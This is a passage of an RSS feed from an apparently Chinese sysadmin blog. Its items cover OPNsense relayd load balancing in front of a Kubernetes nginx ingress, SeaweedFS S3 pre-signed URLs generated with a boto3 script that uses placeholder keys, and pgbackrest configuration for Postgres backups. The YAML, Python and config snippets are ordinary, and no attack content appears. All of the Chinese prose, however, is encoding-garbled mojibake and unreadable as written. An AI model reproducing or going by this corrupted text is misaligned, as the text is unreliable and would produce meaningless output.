&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  namespace: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resourceVersion: &lt;span class=&#34;s2&#34;&gt;&amp;#34;22298827&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  uid: d6eeef3c-7e44-4667-854a-c7693006b221
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘åï¼Œnginx ingressä¼šè‡ªåŠ¨reload&lt;/p&gt;</description>
    </item>
    <item>
      <title>OPNsenseå¦‚ä½•åšLoadBalanceæ¥å…¥åç«¯çš„Kubernetes nginx ingress --- relaydç¯‡</title>
      <link>https://rendoumi.com/posts/20251014-opnsense_relayd/</link>
      <pubDate>Tue, 14 Oct 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251014-opnsense_relayd/</guid>
      <description>&lt;p&gt;æ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š&lt;/p&gt;
&lt;p&gt;é‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;ç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091045980&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091045980.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œå…ˆè¯´ç¬¬ä¸€ä¸ªï¼Œ&lt;code&gt;relayd&lt;/code&gt;çš„åšæ³•&lt;/p&gt;
&lt;p&gt;relaydæ˜¯æœ€æ—©çš„OPNsenseçš„æ’ä»¶ï¼Œç”¨æ¥åšè´Ÿè½½å‡è¡¡ï¼Œå®‰è£…è¿™ä¸ªpluginæ’ä»¶&lt;/p&gt;
&lt;p&gt;é…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;General Settingsï¼š&lt;/p&gt;
&lt;p&gt;ç”±äºè™šæœºçš„cpuæ˜¯4ä¸ªï¼Œæ‰€ä»¥è¿›ç¨‹è®¾ç½®æˆ4&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091310004&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091310004.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Backend Hosts:&lt;/p&gt;
&lt;p&gt;åç«¯èŠ‚ç‚¹æœ‰4ä¸ªï¼Œåªå†™IPå³å¯&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091420120&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091420120.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Table Checksï¼š&lt;/p&gt;
&lt;p&gt;ç«¯å£æ£€æŸ¥ï¼Œå› ä¸ºæ˜¯ç›´é€šï¼Œæ‰€ä»¥å°±è®¾ç½®æˆTCPæ£€æŸ¥å³å¯&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091530055&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091530055.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Tablesï¼š&lt;/p&gt;
&lt;p&gt;Hostsé€‰ä¸­4ä¸ªèŠ‚ç‚¹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091611417&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091611417.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Virtual Serverï¼š&lt;/p&gt;
&lt;p&gt;80å’Œ443å„æœ‰ä¸€ä¸ª&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091724429&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091724429.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªå‘¢ï¼Œè®¾ç½®å¥½å‰é¢çš„ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œåç«¯çš„Table æœåŠ¡å™¨å’ŒTable checkçš„åè®®ï¼Œå°±okäº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091927383&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014091927383.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€åå» General Settings é€‰ä¸­ Enable Relaydï¼Œç„¶åsaveï¼Œå°±å¯ä»¥äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014092113972&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_relayd/image-20251014092113972.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¹ˆå¤šè´´å›¾ï¼Œæ˜¯å› ä¸ºå¦‚æœä»CLIé…ç½®ï¼Œå…¶å®å°±ä¸€ä¸ªå¾ˆç®€å•çš„relayd.confæ–‡æœ¬æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ä»GUIï¼Œå°±ä¸€å¤§å †ï¼Œè€Œä¸”ç”Ÿæˆçš„ä¸œè¥¿ç®€ç›´ä¸çŸ¥æ‰€äº‘&lt;/p&gt;
&lt;p&gt;è¿™æ ·åšrelaydå°±ç›¸å½“äºä¸€ä¸ªç›´é€šçš„LoadBalanceï¼ŒæŠŠæµé‡é€å…¥åç«¯çš„Nginx ingressæ‰€å¼€çš„NodePortã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±å¯ç”¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·æœ‰ä¸ªå¼Šç«¯ï¼ŒNginxçš„ingressæ‹¿ä¸åˆ°å®¢æˆ·ç«¯çš„çœŸå®IPï¼ŒX-forwarded-foræ— æ³•ä¼ è¿‡æ¥çœŸçš„å®¢æˆ·ç«¯IPï¼Œç½‘ä¸ŠæŸ¥æ–‡æ¡£æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä»GUIé…äº†åŠå¤©ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆé…ï¼Œæœäº†ä¹Ÿæ˜¯ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>seaweedfsçš„s3è¿›é˜¶è¯•ç”¨æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20250917-seaweedfs_prod/</link>
      <pubDate>Wed, 17 Sep 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250917-seaweedfs_prod/</guid>
      <description>&lt;p&gt;SeaweedFS å·²ç»ç”¨docker composeçš„æ–¹å¼éƒ¨ç½²åœ¨ç”Ÿäº§ç¯å¢ƒå†…ä¸­äº†ï¼Œå¯¹å¤–åªå¼€æ”¾äº†ä¸€ä¸ªS3çš„ç«¯å£127.0.0.1:8333ï¼Œç„¶åå‰é¢å¥—ä¸ŠCaddyçš„httpsä»£ç†ï¼Œè¿™æ ·å¾ˆå®‰å…¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£è¿›é˜¶çš„è¦æ±‚åˆæ¥äº†ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€s3çš„pre-signedçš„url&#34;&gt;ä¸€ã€S3çš„pre signedçš„URL&lt;/h5&gt;
&lt;p&gt;ç”±äºç¨‹åºä¹‹å‰æ˜¯åœ¨AWSè·‘çš„ï¼Œæ‰€ä»¥ç”¨äº†S3çš„æœ€ä½³å®è·µï¼Œpre sign urlæ¥è¿›è¡Œä¸Šä¼ å’Œä¸‹è½½ï¼Œé‚£seaweedfsä¹Ÿæ˜¯å®Œå…¨æ”¯æŒçš„ï¼ŒåŸºæœ¬æ˜¯æ— ç¼ä¿®æ”¹&lt;/p&gt;
&lt;p&gt;ç»™å‡ºéªŒè¯ç¨‹åºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import boto3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from botocore.client import Config
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Configure the S3 client to point to your SeaweedFS S3 gateway&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;s3_client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; boto3.client&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;s3&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;endpoint_url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://s3.rendoumi.com&amp;#39;&lt;/span&gt;,  &lt;span class=&#34;c1&#34;&gt;# Replace with your SeaweedFS S3 gateway address&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;aws_access_key_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;aaaaaaaa&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;aws_secret_access_key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bbbbbbb&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Config&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;signature_version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;s3v4&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;bucket_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;myfiles&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;object_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;your-object-key&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;expiration_seconds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3600&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# URL valid for 1 hour&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Generate a pre-signed URL for uploading (PUT)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;try:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;upload_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; s3_client.generate_presigned_url&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;put_object&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;Params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Bucket&amp;#39;&lt;/span&gt;: bucket_name, &lt;span class=&#34;s1&#34;&gt;&amp;#39;Key&amp;#39;&lt;/span&gt;: object_key, &lt;span class=&#34;s1&#34;&gt;&amp;#39;ContentType&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/octet-stream&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;ExpiresIn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;expiration_seconds
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Pre-signed URL for upload: {upload_url}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;except Exception as e:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error generating upload URL: {e}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Generate a pre-signed URL for downloading (GET)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;try:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;download_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; s3_client.generate_presigned_url&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;get_object&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;Params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Bucket&amp;#39;&lt;/span&gt;: bucket_name, &lt;span class=&#34;s1&#34;&gt;&amp;#39;Key&amp;#39;&lt;/span&gt;: object_key&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;ExpiresIn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;expiration_seconds
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Pre-signed URL for download: {download_url}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;except Exception as e:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error generating download URL: {e}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;èƒ½çœ‹åˆ°ä¸´æ—¶ç”Ÿæˆçš„uploadçš„URLå’Œdownloadçš„URLï¼Œæ˜¯å®Œç¾æ”¯æŒçš„&lt;/p&gt;</description>
    </item>
    <item>
      <title>Postgres pgbackrestå¤‡ä»½ä»¥åŠæŒ‡å®šæ—¶é—´ç‚¹æ¢å¤</title>
      <link>https://rendoumi.com/posts/20250915-pgbackrest_restore/</link>
      <pubDate>Mon, 15 Sep 2025 10:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250915-pgbackrest_restore/</guid>
      <description>&lt;p&gt;æœ€è¿‘ç‹ æŠ˜è…¾äº†ä¸€é€špostgresçš„å¤‡ä»½ï¼Œè·ŸMySQLçš„é˜¿é‡ŒRDBæ¢å¤ä¸€æ ·ï¼Œå¦‚ä½•ä¸åœæ­¢æ•°æ®åº“æœåŠ¡ï¼Œæ¢å¤æŸä¸ªè¡¨çš„æ•°æ®åˆ°æŸä¸ªæ—¶é—´ç‚¹ï¼Œç„¶åæ”¾åˆ°å¦ä¸€ä¸ªè¡¨ä¸­å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å…¶å®ç”¨ä¹‹å‰çš„walæ¢å¤ä¸€æ ·çš„ï¼Œå°±æ˜¯è¦æŠŠå½“å¤©å®ä¾‹çš„å…¨å¤‡ä»½å’Œwaléƒ½å¤åˆ¶åˆ°å¦å¤–ä¸€å°ä¸Šï¼Œç„¶åæ¢å¤ï¼Œå†æŠŠæ•°æ®ç»™dumpä¸‹æ¥ï¼Œå†å»ºä¸€ä¸ªæ–°è¡¨ï¼ŒæŠŠæ•°æ®å¯¼å›å»ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://rendoumi.com/posts/20250728-postgres_wal_pitr/&#34;&gt;Postgresçš„walå’ŒPITRæ—¶é—´ç‚¹æ¢å¤&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç”¨pgbackrestæ„Ÿè§‰ä¼šå¥½ä¸€äº›ï¼Œå…¶å®éƒ½å·®ä¸å¤šï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€å®‰è£…å¹¶é…ç½®pgbackrest&#34;&gt;ä¸€ã€å®‰è£…å¹¶é…ç½®pgbackrest&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install pgbackrest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å»ºç«‹å¤‡ä»½çš„å¤§æœ¬è¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /var/lib/pgbackrest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;750&lt;/span&gt; /var/lib/pgbackrest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chown postgres:postgres /var/lib/pgbackrest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¼–è¾‘ /etc/pgbackrest.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;global&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;repo1-path&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/lib/pgbackrest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;repo1-retention-full&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;repo1-retention-archive&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;180&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-level-file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-level-console&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;global:archive-push&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;compress-level&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;main&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pg1-path&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/lib/postgresql/13/main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pg1-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5432&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®²è§£ä¸€ä¸‹å‚æ•°&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;globalé‡Œé¢æ˜¯å…¨å±€é…ç½®&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo1-path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;/var/lib/pgbackrest   # pgBackRest å­˜å‚¨åº“è·¯å¾„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo1-retention-full&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;26          # ä¿ç•™æœ€è¿‘çš„ 26 ä¸ªå…¨é‡å¤‡ä»½ï¼Œå¤§æ¦‚6ä¸ªæœˆï¼Œ180å¤©&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo1-retention-archive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;180      # ä¿ç•™æœ€è¿‘ 180 å¤©çš„ WAL æ—¥å¿—&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;log-level-file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;info              # æ–‡ä»¶æ—¥å¿—çº§åˆ«&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;log-level-console&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;info           # æ§åˆ¶å°æ—¥å¿—çº§åˆ«&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;global:archive-push è®¾ç½®çš„æ˜¯walå½’æ¡£çš„ä¿å­˜æ–¹å¼æ˜¯å‹ç¼©ä¿å­˜&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mainéƒ¨åˆ†è®¾ç½®çš„æ˜¯è¦å¤‡ä»½çš„postgresæºçš„è·¯å¾„å’Œç«¯å£ï¼Œã€mainã€‘æ˜¯stanzaçš„åå­—&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
